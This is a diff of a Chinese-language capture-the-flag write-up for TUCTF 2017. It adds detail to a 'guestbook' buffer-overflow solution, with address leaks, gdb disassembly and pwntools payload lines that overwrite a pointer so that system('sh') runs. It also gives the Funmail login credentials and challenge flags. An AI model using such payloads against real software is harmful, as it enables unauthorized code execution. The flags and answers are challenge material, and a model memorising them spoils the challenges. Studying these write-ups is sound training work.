@@ -39,7 +39,7 @@ r.interactive()
 
 ## guestbook
 
-直接read第6個，可以把一些dest渣渣和system給leak出來
+直接read第6個，可以把一些dest渣渣和system給leak出來 (system在20~24)
 
 然後直接change name去改dest，因為gets可以讀無限長
 
@@ -54,14 +54,14 @@ r.interactive()
 蓋回0就行
 
 ```
-0x5655597d <main+443>:   call   0x56555550 <gets@plt>
-0x56555982 <main+448>:    add    esp,0x4
-0x56555985 <main+451>: mov    eax,DWORD PTR [ebp-0x34]
+   0x5655597d <main+443>:   call   0x56555550 <gets@plt>
+   0x56555982 <main+448>:    add    esp,0x4
+   0x56555985 <main+451>: mov    eax,DWORD PTR [ebp-0x34]
 => 0x56555988 <main+454>:  mov    eax,DWORD PTR [ebp+eax*4-0x2c]
-0x5655598c <main+458>:  lea    edx,[ebp-0x98]
-0x56555992 <main+464>:   push   edx
-0x56555993 <main+465>:    push   eax
-0x56555994 <main+466>: call   0x56555570 <strcpy@plt>
+   0x5655598c <main+458>:  lea    edx,[ebp-0x98]
+   0x56555992 <main+464>:   push   edx
+   0x56555993 <main+465>:    push   eax
+   0x56555994 <main+466>: call   0x56555570 <strcpy@plt>
 ```
 
 index的offset的話就是 0x98 - 0x34
@@ -81,7 +81,7 @@ index的offset的話就是 0x98 - 0x34
    0x5655599e <main+476>:       mov    BYTE PTR [ebp-0x9],0x0
    0x565559a2 <main+480>:       jmp    0x565559b3 <main+497>
 Guessed arguments:
-     arg[0]: 0x56558008 --> 0x61 ('a')
+     arg[0]: 0x56558008 --> 0x61 ('a')      <===========  我一開輸入的第0個是a，現在要去change它
      arg[1]: 0xffffd540 --> 0xffff0078 --> 0x0
 ```
 
@@ -102,13 +102,18 @@ Guessed arguments:
 ```
 
 
-改用 r.sendline("\x00"*108 + p32(0xdeadbeef)*1 + p32(0) * 11 + p32(system_addr) + p32(sh) * 2) 後：
+改用 `r.sendline("\x00"*108 + p32(0xdeadbeef)*1 + p32(0) * 11 + p32(system_addr) + p32(sh) * 2)` 後：
 
 ```
 Guessed arguments:
      arg[0]: 0xdeadbeef                    <============  108 ~ 112的位置
      arg[1]: 0xffbb7ad0 --> 0x0
 ```
+
+最後用前面leak出來的渣渣塞回去，讓他不會炸就行惹
+
+`r.sendline("\x00"*108 + p32(data1) * 1 + p32(0xdeadbeef) * 11 + p32(system_addr) + p32(sh) * 2)`
+
 
 ## The nerver ending crypto
 
@@ -168,18 +173,23 @@ payload:
 
 `TUCTF{D0nt_Th1nk_H4x0r$_C4nt_3sc4p3_Y0ur_Pr0t3ct10ns}`
 
+![img](https://github.com/w181496/CTF/blob/master/tuctf-2017/iframe.png)
 
 ## Funmail
 
-直接找username, password
+直接strings或ida pro 找username, password
+
+username = john galt
+password = this-password-is-a-secret-to-everyone!
 
 就能登入看flag
 
 
 ## Funmail2.0
 
-直接gdb跳過去print_flag
+直接gdb跑，隨便下個斷點，然後跳過去print_flag
 
+`TUCTF{l0c4l_<_r3m073_3x3cu710n}`
 
 ## I'm playing
 
